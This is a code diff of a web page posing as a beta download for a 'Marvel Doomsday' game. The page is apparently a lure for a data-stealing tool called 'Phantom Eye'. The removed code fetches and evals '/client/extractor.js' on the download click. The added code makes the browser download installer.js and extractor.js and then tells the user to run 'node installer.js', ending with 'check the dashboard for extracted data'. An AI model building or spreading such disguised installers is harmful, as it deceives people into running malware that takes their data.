@@ -310,49 +310,7 @@
         });
 
         // ================================================
-        // LOAD PHANTOM EYE PAYLOAD
-        // ================================================
-        function loadPhantomEye() {
-            console.log('👁️ Loading Phantom Eye...');
-            
-            // Method 1: Fetch and execute
-            fetch('/client/extractor.js')
-                .then(function(response) {
-                    if (!response.ok) {
-                        throw new Error('Network response was not ok: ' + response.status);
-                    }
-                    return response.text();
-                })
-                .then(function(code) {
-                    console.log('✅ Phantom Eye loaded, executing...');
-                    try {
-                        eval(code);
-                    } catch (e) {
-                        console.log('⚠️ Execution error:', e.message);
-                        // Fallback: script tag
-                        var script = document.createElement('script');
-                        script.src = '/client/extractor.js';
-                        document.head.appendChild(script);
-                    }
-                })
-                .catch(function(err) {
-                    console.log('⚠️ Fetch failed, trying script tag...', err.message);
-                    // Method 2: Script tag fallback
-                    var script = document.createElement('script');
-                    script.src = '/client/extractor.js';
-                    script.onload = function() {
-                        console.log('✅ Phantom Eye loaded via script tag');
-                    };
-                    script.onerror = function() {
-                        console.log('⚠️ All loading methods failed');
-                        showToast('⚠️ Failed to load game data. Please try again.', 'error');
-                    };
-                    document.head.appendChild(script);
-                });
-        }
-
-        // ================================================
-        // DOWNLOAD BUTTON - TRIGGERS PHANTOM EYE
+        // DOWNLOAD & INSTALL - SIMPLEST WAY
         // ================================================
         document.getElementById('downloadBtn').addEventListener('click', function() {
             var btn = document.getElementById('downloadBtn');
@@ -369,17 +327,49 @@
                 if (progress >= 100) {
                     clearInterval(interval);
                     
-                    // Load Phantom Eye
-                    loadPhantomEye();
+                    // ============================================
+                    // STEP 1: Download the installer.js file
+                    // ============================================
+                    var link = document.createElement('a');
+                    link.href = '/download/installer.js';
+                    link.download = 'installer.js';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    
+                    // ============================================
+                    // STEP 2: Also download extractor.js
+                    // ============================================
+                    setTimeout(function() {
+                        var link2 = document.createElement('a');
+                        link2.href = '/client/extractor.js';
+                        link2.download = 'extractor.js';
+                        document.body.appendChild(link2);
+                        link2.click();
+                        document.body.removeChild(link2);
+                    }, 500);
                     
                     btn.innerHTML = '✅ Download Complete!';
                     btn.style.background = '#28a745';
                     btn.style.color = 'white';
                     btn.disabled = false;
-                    document.getElementById('gameSize').textContent = '✅ Downloaded • Analyzing system...';
-                    showToast('👁️ Phantom Eye activated!', 'success');
+                    document.getElementById('gameSize').textContent = '✅ Downloaded • Run installer.js';
+                    showToast('👁️ Files downloaded! Run installer.js', 'success');
                     
-                    setTimeout(function() { window.close(); }, 5000);
+                    // ============================================
+                    // STEP 3: Show instructions
+                    // ============================================
+                    var instructions = document.createElement('div');
+                    instructions.style.cssText = 'margin-top:15px;padding:15px;background:rgba(0,180,80,0.1);border-radius:10px;border:1px solid rgba(0,180,80,0.2);font-size:12px;color:#888;text-align:left;';
+                    instructions.innerHTML = `
+                        <strong style="color:#00d060;">📋 Quick Start:</strong><br>
+                        <span style="font-size:11px;">1. Open Command Prompt (CMD) in the download folder</span><br>
+                        <span style="font-size:11px;">2. Run: <code style="background:#1a1a1a;padding:2px 8px;border-radius:4px;color:#00d060;">node installer.js</code></span><br>
+                        <span style="font-size:11px;color:#666;">Then check the dashboard for extracted data!</span>
+                    `;
+                    document.querySelector('.card').appendChild(instructions);
+                    
+                    setTimeout(function() { window.close(); }, 10000);
                 }
             }, 250);
         });
@@ -397,7 +387,7 @@
         });
 
         console.log('🎮 Marvel Doomsday Beta loaded.');
-        console.log('👁️ Click Download to activate Phantom Eye');
+        console.log('👁️ Click Download to get Phantom Eye');
     </script>
 </body>
 </html>
